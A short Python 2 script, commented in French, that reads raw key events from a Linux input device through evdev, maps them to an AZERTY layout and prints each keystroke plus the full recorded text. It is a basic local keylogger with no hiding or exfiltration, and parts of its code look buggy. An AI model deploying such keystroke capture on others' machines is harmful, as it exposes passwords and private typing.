#!/usr/bin/python
# coding: utf8

import string
import sys
from evdev import InputDevice
from select import select



try:
	userKeyboardDevice = sys.argv[1]
except:
	userKeyboardDevice = '/dev/input/event0'

keys = "X^&é'(-è_çàXazertyuiopXXXXqsdfghjklmXXXXwxcvbn,;:!XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX<XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
#B=alt

dev = InputDevice(userKeyboardDevice)

if userKeyboardDevice != "" :
	dev=InputDevice(userKeyboardDevice)
print "--------------------KEYBOARD DEVICE--------------------------"
print "[+] "+userKeyboardDevice+"\n"
print "--------------------{KEYBOARD LOGGING STARTED ON DEVICE: "+userKeyboardDevice+"}--------------------------"

def keyspe(touchecode):
	switcher={
	    1: "Echap",
	    3: "é",
	    4: "\"",
	    5: "'",
	    8: "è",
	    9: "_",
	    10: "ç",
	    11: "à",
	    12: ")",
	    13: "=",
	    14: "Backspace",
	    15: "Tab",
	    26: "¨",
	    27: "$",
	    28: "ENTREE",
	    29: "Ctrl Gauche",
	    40: "Ù",
	    41: "²",
	    42: "Shift Gauche",
	    43: "*",
	    54: "Shift Droit",
	    56: "Alt Gauche",
	    57: "Espace",
	    58: "Verr. Num.",
	    59: "F1",
	    60: "F2",
	    61: "F3",
	    62: "F4",
	    63: "F5",
	    64: "F6",
	    65: "F7",
	    66: "F8",
	    67: "F9",
	    68: "F10",
	    69: "F11",
	    70: "F12",
	    99: "Impr. Ecran",
	    103: "Fleche HAUT",
	    104: "Page HAUT",
	    105: "Fleche DROITE",
	    106: "Fleche GAUCHE",
	    108: "Fleche BAS",
	    109: "Page BAS",
	    110: "Insert",
	    111: "Suppr.",
	    999: "XD"
	}
	return switcher.get(touchecode,0)
fullphrase=''
touchecode_previous=-1
try:
	while True:
	   r,w,x = select([dev], [], [])
	   for event in dev.read():
		if event.type==1 and event.value==1:
			touchecode=str(event.code);
			touche=keys[ int(touchecode) ];
			touchecodeascii=str(ord(touche));
			ks=keyspe(int(touchecode));
			if ks != 0:
				touche=" ["+ks+"] ";

			if ( touchecode_previous == 42 ) or ( touchecode_previous == 54):
				touche=" [MAJ "+touche+"] ";

		        print( '\n[+] CODE TOUCHE:'+ touchecode +' => TOUCHE: "'+touche+'"(ASCII:'+touchecodeascii+') '+str(touchecode_previous)+''), #<'+str(ks)+'>
			fullphrase=fullphrase+touche+""
			touchecode_previous=int(touchecode);
			print( '!')
except:
	 print( '\n[+] Recorded sentense:\n'+fullphrase);

print( '\n[+] Bye!')
